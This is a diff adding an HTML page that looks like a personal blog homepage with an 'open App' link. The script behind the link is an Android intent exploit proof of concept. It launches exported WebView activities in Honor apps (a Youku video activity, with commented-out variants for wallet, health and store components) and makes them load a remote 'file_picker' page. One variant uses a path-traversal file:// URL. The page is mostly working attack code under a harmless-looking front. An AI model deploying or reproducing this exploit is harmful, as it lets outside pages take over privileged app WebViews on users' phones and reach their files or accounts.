@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HNHCSL</title>
+    <style>
+        h1 {
+            font-size: 36px; /* Adjust this value to make the text bigger or smaller */
+        }
+        a {
+            font-size: 24px; /* Adjust this value to make the text bigger or smaller */
+        }
+    </style>
+</head>
+<body>
+    <h1>HNHCSL的个人主页</h1>
+    <h1>Welcome to HNHCSL blog.</h1>
+    <a id="a" href="#">打开App</a>
+</body>
+<script>
+    let jsonData = {
+        id: "25",
+        url: "https://shinibufahaha.github.io/cp0/file_picker.html",
+    };
+
+    let jsonString = JSON.stringify(jsonData);
+    let local_url = "file:///android_asset/%2E%2E/data/local/tmp/test.html";
+    //let flask_url = "http://192.168.200.178/native";
+    let flask_url = "https://shinibufahaha.github.io/cp0/file_picker.html";
+    window.onload = function() {
+        document.getElementById("a").onclick = function() {
+            //document.location.href = `intent://cn.honor.qinxuan/pullUp/hChoice?launchExtra=${encodeURIComponent(jsonString)}#Intent;scheme=qx;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;S.launchExtra=${encodeURIComponent(jsonString)};S.url=https://hnhcsl.github.io/yoyo.html;component=cn.honor.qinxuan/cn.honor.qinxuan.splash.ExternalPullUpActivity;end`;
+            //document.location.href = `intent:#Intent;S.web_url=${local_url};component=com.hihonor.health/com.hihonor.module.mine.submodule.privacy.view.PrivacyWebViewActivity;end`;
+            //document.location.href = `intent://business/loan#Intent;scheme=wallet;S.url=${flask_url};component=com.hihonor.id/com.hihonor.wallet.business.WalletBusinessRouterActivity;end`;
+            //document.location.href = `intent:#Intent;scheme=wallet;host=business;path=loan;S.url=${flask_url};package=com.hihonor.id;component=com.hihonor.id/com.hihonor.wallet.business.WalletBusinessRouterActivity;end`;
+            //document.location.href = `intent://#Intent;scheme=rongyaoshangcheng;S.url=${flask_url};end`;
+            document.location.href = `intent://honorhttps#Intent;scheme=youku;S.url=${flask_url};component=com.hihonor.youku.video/com.youku.ui.activity.WVWebViewActivity;end`;
+            //document.location.href = 
+}
+    }
+
+</script>
+</html>
